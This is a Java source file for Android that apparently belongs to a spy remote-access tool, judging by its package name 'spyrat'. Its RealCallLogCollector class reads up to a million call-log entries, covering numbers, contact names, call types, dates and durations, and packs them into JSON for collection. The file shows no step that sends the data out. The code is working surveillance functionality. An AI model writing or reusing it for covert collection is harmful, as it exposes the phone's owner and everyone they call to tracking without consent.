package com.spyrat.investigation;

import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.util.Date;

public class RealCallLogCollector {
    private static final String TAG = "RealCallLogCollector";
    private Context context;

    public RealCallLogCollector(Context context) {
        this.context = context;
    }

    public JSONArray getCallLogs() {
        JSONArray callLogs = new JSONArray();
        Cursor cursor = null;
        
        try {
            Log.d(TAG, "📱 Starting call logs collection...");
            
            String[] projection = new String[]{
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.CACHED_NAME
            };
            
            cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 1000000"
            );
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    try {
                        JSONObject call = new JSONObject();
                        call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                        call.put("type", getCallType(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
                        call.put("date", new Date(cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE))).toString());
                        call.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                        call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
                        
                        callLogs.put(call);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error parsing call log: " + e.getMessage());
                    }
                } while (cursor.moveToNext());
            }
            
            Log.d(TAG, "✅ Collected " + callLogs.length() + " call logs");
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Call log permission denied: " + e.getMessage());
        } catch (Exception e) {
            Log.e(TAG, "❌ Call log collection error: " + e.getMessage());
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        
        return callLogs;
    }
    
    private String getCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE: return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE: return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE: return "MISSED";
            case CallLog.Calls.VOICEMAIL_TYPE: return "VOICEMAIL";
            case CallLog.Calls.REJECTED_TYPE: return "REJECTED";
            case CallLog.Calls.BLOCKED_TYPE: return "BLOCKED";
            default: return "UNKNOWN";
        }
    }
}
